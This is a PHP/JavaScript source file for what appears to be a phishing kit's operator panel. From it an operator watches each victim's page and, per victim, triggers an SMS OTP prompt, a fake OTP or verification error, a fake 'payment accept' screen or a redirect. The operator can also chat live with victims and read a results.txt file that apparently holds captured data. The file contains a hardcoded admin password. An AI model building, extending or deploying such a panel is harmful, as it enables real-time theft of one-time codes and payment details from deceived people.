<?php
session_start();
require_once __DIR__ . '/lib/user_panel.php';

$resultsFile = __DIR__ . '/results.txt';
$validUser = 'admin';
$validPass = 'JJKadmin2026';
$message = '';

function sanitizeUserId($value)
{
    return preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $value);
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if ($user === $validUser && $pass === $validPass) {
        $_SESSION['is_admin'] = true;
    } else {
        $message = 'Invalid username or password.';
    }
}

$isAdmin = !empty($_SESSION['is_admin']);
$users = panelReadUsers();
$selectedUserId = sanitizeUserId($_GET['user'] ?? $_POST['user_id'] ?? '');
if ($selectedUserId === '' && !empty($users)) {
    $selectedUserId = array_key_first($users);
}

if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
    $smsMode = $_POST['sms_mode'] ?? 'default';
    $customUrl = trim($_POST['custom_url'] ?? '');
    $customError = trim($_POST['custom_error'] ?? '');
    $instruction = $_POST['instruction'] ?? 'stay_wait';
    $chatEnabled = !empty($_POST['chat_enabled']);
    $targetUserId = sanitizeUserId($_POST['user_id'] ?? '');

    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];

    if ($targetUserId === '') {
        $message = 'Please choose a user before applying updates.';
        $success = false;
    } elseif (!in_array($smsMode, $validModes, true)) {
        $message = 'Invalid SMS mode selection.';
        $success = false;
    } elseif (!in_array($instruction, $validInstructions, true)) {
        $message = 'Invalid instruction selection.';
        $success = false;
    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
        $success = false;
    } else {
        panelSaveState($targetUserId, $smsMode, $customUrl, $customError, $instruction, $chatEnabled);
        $message = 'User flow updated successfully.';
        $success = true;
    }

    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success ?? false,
        'message' => $message,
        'state' => $targetUserId !== '' ? panelLoadState($targetUserId) : panelDefaults()
    ]);
    exit;
}

$currentState = $selectedUserId !== '' ? panelLoadState($selectedUserId) : panelDefaults();
$currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms';
$currentSmsAction = 'show_sms_error';
if ($currentState['mode'] === 'payment_accept') {
    $currentSmsAction = 'show_payment_accept';
} elseif ($currentState['mode'] === 'redirect_custom' || $currentState['mode'] === 'redirect_wait') {
    $currentSmsAction = 'redirection_url';
} elseif ($currentState['mode'] === 'default' && $currentState['instruction'] === 'prompt_otp') {
    $currentSmsAction = 'nothing';
}
$chatLog = $selectedUserId !== '' ? panelLoadChat($selectedUserId) : [];
$resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>body{font-family:Arial;background:#0a0a0a;color:#f3f3f3;margin:0}.container{max-width:1250px;margin:20px auto;padding:20px;background:#121212;border:1px solid #2b2b2b;border-radius:12px}.grid{display:grid;grid-template-columns:280px 1fr;gap:15px}.card{background:#1a1a1a;border:1px solid #2f2f2f;border-radius:10px;padding:14px}.users a{display:block;padding:9px;border-radius:8px;color:#ddd;text-decoration:none;margin-bottom:8px;background:#171717}.users a.active{background:#273041;color:#fff}.meta{font-size:12px;color:#a5a5a5}.chat-box{max-height:280px;overflow:auto;background:#111;border:1px solid #333;padding:10px;border-radius:8px}.chat-message{padding:8px;border-radius:8px;margin:8px 0}.chat-message.user{background:#1d331f}.chat-message.admin{background:#1f2f40}.row{margin-bottom:12px}label{display:block;font-weight:600;margin-bottom:6px}input[type=text],input[type=password],textarea,select{width:100%;padding:10px 12px;border-radius:10px;border:1px solid #333;background:#101010;color:#f3f3f3}.control-card{background:linear-gradient(180deg,#1b1f2d,#171717);border-color:#394664}.control-card .row-group{padding:12px;border:1px solid #2a3148;border-radius:10px;background:#0f1320;margin-bottom:12px}.row-hint{font-size:12px;color:#9cb0d8;margin-top:4px}.hidden{display:none}.admin-select{border-color:#42527d;background:#0d1426}.admin-select:focus,textarea:focus,input[type=text]:focus{outline:none;border-color:#6e86c1;box-shadow:0 0 0 2px rgba(110,134,193,.2)}button{background:#e50914;color:#fff;border:none;padding:10px 14px;border-radius:7px;cursor:pointer}.flash{padding:10px;border-radius:7px;background:#15311a;border:1px solid #2f5c33;display:none}.flash.error{background:#3a1717;border-color:#7d2e2e}.chat-input-wide{min-height:115px;resize:vertical}</style>
</head>
<body>
<?php if (!$isAdmin): ?>
<div class="container" style="max-width:420px;margin-top:80px;">
    <h1>Admin Login</h1>
    <?php if ($message): ?><div class="flash error" style="display:block"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
    <form method="post">
        <input type="hidden" name="action" value="login">
        <div class="row"><label>Username</label><input type="text" name="username" required></div>
        <div class="row"><label>Password</label><input type="password" name="password" required></div>
        <button type="submit">Login</button>
    </form>
</div>
<?php else: ?>
<div class="container">
    <div style="display:flex;justify-content:space-between;align-items:center"><h1>Admin Panel (TXT Multi User)</h1><a href="?logout=1" style="color:#9ed0ff">Logout</a></div>
    <div class="grid">
        <div class="card users">
            <h3>Users</h3>
            <?php if (empty($users)): ?><div class="meta">No users yet.</div><?php endif; ?>
            <?php foreach ($users as $user): ?>
                <a href="?user=<?php echo urlencode($user['id']); ?>" class="<?php echo $selectedUserId === $user['id'] ? 'active' : ''; ?>">
                    <strong><?php echo htmlspecialchars($user['name'] ?: 'Unknown'); ?></strong><br>
                    <span class="meta">ID: <?php echo htmlspecialchars($user['id']); ?></span><br>
                    <span class="meta">Page: <?php echo htmlspecialchars($user['page']); ?></span>
                </a>
            <?php endforeach; ?>
        </div>
        <div>
            <div class="card control-card">
                <h3>Control selected user</h3>
                <div class="meta">Selected ID: <strong id="selected-user-id"><?php echo htmlspecialchars($selectedUserId ?: '-'); ?></strong></div>
                <div class="flash" id="flash-message"></div>
                <form id="sms-form">
                    <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($selectedUserId); ?>">
                    <input type="hidden" name="sms_mode" id="sms_mode" value="default">
                    <input type="hidden" name="instruction" id="instruction" value="stay_wait">
                    <div class="row-group">
                        <div class="row"><label>Control route</label><select id="control_route" class="admin-select">
                            <?php foreach (['waiting'=>'Send user to Waiting page','sms'=>'Send user to SMS page'] as $k=>$v): ?>
                                <option value="<?php echo $k; ?>" <?php echo $currentRoute===$k?'selected':''; ?>><?php echo $v; ?></option>
                            <?php endforeach; ?>
                        </select>
                        <div class="row-hint">First choose where the user should be directed.</div></div>
                        <div class="row hidden" id="sms-actions-row"><label>SMS action</label><select id="sms_action" class="admin-select">
                            <?php foreach (['nothing'=>'Nothing (SMS page only)','show_sms_error'=>'Show SMS error','redirection_url'=>'Redirection URL','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
                                <option value="<?php echo $k; ?>" <?php echo $currentSmsAction===$k?'selected':''; ?>><?php echo $v; ?></option>
                            <?php endforeach; ?>
                        </select>
                        <div class="row-hint">This menu appears only when SMS is selected.</div></div>
                    </div>
                    <div class="row hidden" id="custom-url-row"><label>Redirection URL</label><input type="text" name="custom_url" id="custom_url" placeholder="https://example.com/redirect" value="<?php echo htmlspecialchars($currentState['custom_url'] ?? ''); ?>"></div>
                    <div class="row hidden" id="custom-error-row"><label>Custom error message</label><textarea name="custom_error" class="chat-input-wide" placeholder="Write a custom error message for SMS page..."><?php echo htmlspecialchars($currentState['custom_error'] ?? ''); ?></textarea></div>
                    <button type="submit">Apply Update</button>
                </form>
            </div>
            <div class="card" style="margin-top:12px">
                <h3>Live Chat</h3>
                <div class="row"><label><input type="checkbox" id="chat-enabled-toggle" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for selected user</label></div>
                <div class="meta" style="margin-bottom:10px">Chats are isolated per user ID. You can reply to multiple users below without switching pages.</div>
                <div id="multi-chat-container"></div>
            </div>
            <div class="card" style="margin-top:12px"><h3>results.txt</h3><pre style="white-space:pre-wrap"><?php echo htmlspecialchars($resultsContent); ?></pre></div>
        </div>
    </div>
</div>
<?php endif; ?>
<script>
const selectedUserId = <?php echo json_encode($selectedUserId); ?>;
const allUsers = <?php echo json_encode(array_values($users), JSON_UNESCAPED_SLASHES); ?>;
const smsForm = document.getElementById('sms-form');
const flashMessage = document.getElementById('flash-message');
const multiChatContainer = document.getElementById('multi-chat-container');
const controlRoute = document.getElementById('control_route');
const smsActionsRow = document.getElementById('sms-actions-row');
const smsAction = document.getElementById('sms_action');
const smsModeField = document.getElementById('sms_mode');
const instructionField = document.getElementById('instruction');
const customUrlRow = document.getElementById('custom-url-row');
const customErrorRow = document.getElementById('custom-error-row');
const customUrlField = document.getElementById('custom_url');
const chatEnabledToggle = document.getElementById('chat-enabled-toggle');

function escapeHtml(value){
    return String(value || '').replace(/[&<>"']/g, (ch) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[ch]));
}

function syncControlState(){
    if(!controlRoute||!smsModeField||!instructionField){return;}
    const route = controlRoute.value;
    const action = smsAction ? smsAction.value : 'nothing';
    const isSmsRoute = route === 'sms';
    const showCustomUrl = isSmsRoute && action === 'redirection_url';
    const showCustomError = isSmsRoute && action === 'show_sms_error';

    if (smsActionsRow) {
        smsActionsRow.classList.toggle('hidden', !isSmsRoute);
    }

    if (customUrlRow) {
        customUrlRow.classList.toggle('hidden', !showCustomUrl);
    }

    if (customErrorRow) {
        customErrorRow.classList.toggle('hidden', !showCustomError);
    }

    if(route === 'waiting'){
        instructionField.value = 'stay_wait';
        smsModeField.value = 'default';
        if(customUrlField){
            customUrlField.value = '';
        }
        return;
    }

    instructionField.value = 'prompt_otp';
    if(action === 'show_payment_accept'){
        smsModeField.value = 'payment_accept';
    } else if(action === 'redirection_url'){
        smsModeField.value = 'redirect_custom';
    } else if(action === 'show_sms_error') {
        smsModeField.value = 'error_verification';
        instructionField.value = 'otp_error';
    } else {
        smsModeField.value = 'default';
    }
}

function chatCardId(userId){
    return 'chat-card-' + userId;
}

function renderChatCard(user){
    if (!multiChatContainer || !user || !user.id) return;
    const id = chatCardId(user.id);
    let card = document.getElementById(id);
    if (!card) {
        card = document.createElement('div');
        card.id = id;
        card.className = 'card';
        card.style.marginBottom = '10px';
        card.innerHTML = `
            <h4 style="margin:0 0 8px 0">${escapeHtml(user.name || 'Unknown')} <span class="meta">(${escapeHtml(user.id)})</span></h4>
            <div class="meta" data-role="chat-status" style="margin-top:8px"></div>
            <div data-role="chat-content">
                <div class="chat-box" data-role="chat-box"><div class="meta">Loading...</div></div>
                <div class="row" data-role="chat-input-row" style="margin-top:8px"><textarea class="chat-input-wide" data-role="chat-input" placeholder="Write your message"></textarea></div>
                <button type="button" data-role="chat-send">Send</button>
            </div>
        `;
        multiChatContainer.appendChild(card);

        const sendButton = card.querySelector('[data-role="chat-send"]');
        const input = card.querySelector('[data-role="chat-input"]');
        sendButton.addEventListener('click', () => sendChat(user.id));
        input.addEventListener('keydown', (event) => {
            if (event.key === 'Enter' && !event.shiftKey) {
                event.preventDefault();
                sendChat(user.id);
            }
        });
    }
}

function renderMessages(userId, messages){
    const card = document.getElementById(chatCardId(userId));
    if (!card) return;
    const box = card.querySelector('[data-role="chat-box"]');
    if (!box) return;
    if (!messages.length) {
        box.innerHTML = '<div class="meta">No messages yet.</div>';
        return;
    }

    box.innerHTML = messages.map((entry) => `
        <div class="chat-message ${entry.sender === 'admin' ? 'admin' : 'user'}">
            ${escapeHtml(entry.message).replace(/\n/g, '<br>')}
            <div class="meta">${escapeHtml(entry.sender)} • ${escapeHtml(entry.formatted || '')}</div>
        </div>
    `).join('');
    box.scrollTop = box.scrollHeight;
}

function setChatEnabled(userId, enabled){
    const card = document.getElementById(chatCardId(userId));
    if (!card) return;
    const status = card.querySelector('[data-role="chat-status"]');
    const content = card.querySelector('[data-role="chat-content"]');
    const input = card.querySelector('[data-role="chat-input"]');
    const send = card.querySelector('[data-role="chat-send"]');
    if (content) {
        content.style.display = enabled ? '' : 'none';
    }
    if (input) input.disabled = !enabled;
    if (send) send.disabled = !enabled;
    if (status) {
        status.textContent = enabled ? 'Chat is enabled for this user.' : 'Chat disabled. Enable chat for selected user to show messages and reply box.';
    }
}

async function fetchChatForUser(userId){
    try {
        const response = await fetch('chat_api.php?action=fetch&user_id=' + encodeURIComponent(userId));
        const data = await response.json();
        renderMessages(userId, data.messages || []);
        setChatEnabled(userId, !!data.chat_enabled);
    } catch (error) {
        console.error('Unable to fetch chat for user', userId, error);
    }
}

async function fetchAllChats(){
    for (const user of allUsers) {
        fetchChatForUser(user.id);
    }
}

function updateSelectedChatVisibility(){
    if (!multiChatContainer || !selectedUserId) return;
    const selectedCard = document.getElementById(chatCardId(selectedUserId));
    if (!selectedCard) return;
    const enabled = chatEnabledToggle ? chatEnabledToggle.checked : false;
    const content = selectedCard.querySelector('[data-role="chat-content"]');
    const status = selectedCard.querySelector('[data-role="chat-status"]');
    if (content) {
        content.style.display = enabled ? '' : 'none';
    }
    if (status && !enabled) {
        status.textContent = 'Chat area is hidden. Enable chat for selected user then click Apply Update.';
    }
}

async function sendChat(userId){
    const card = document.getElementById(chatCardId(userId));
    if (!card) return;
    const input = card.querySelector('[data-role="chat-input"]');
    if (!input || !input.value.trim()) return;
    const message = input.value.trim();
    input.value = '';

    try {
        await fetch('chat_api.php?action=send', {
            method:'POST',
            headers:{'Content-Type':'application/x-www-form-urlencoded'},
            body:new URLSearchParams({sender:'admin',message,user_id:userId})
        });
        fetchChatForUser(userId);
    } catch (error) {
        console.error('Unable to send message for user', userId, error);
    }
}

if (multiChatContainer) {
    allUsers.forEach((user) => renderChatCard(user));
    if (selectedUserId) {
        const selectedCard = document.getElementById(chatCardId(selectedUserId));
        if (selectedCard) {
            selectedCard.style.border = '1px solid #5b74ad';
        }
    }
    fetchAllChats();
    updateSelectedChatVisibility();
    setInterval(fetchAllChats, 1000);
}

if (chatEnabledToggle) {
    chatEnabledToggle.addEventListener('change', updateSelectedChatVisibility);
}
if(controlRoute){controlRoute.addEventListener('change',syncControlState);} if(smsAction){smsAction.addEventListener('change',syncControlState);} syncControlState();
if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';if (selectedUserId) {fetchChatForUser(selectedUserId);} if (chatEnabledToggle && data.state) {chatEnabledToggle.checked = !!data.state.chat_enabled;} updateSelectedChatVisibility();});}
</script>
</body>
</html>
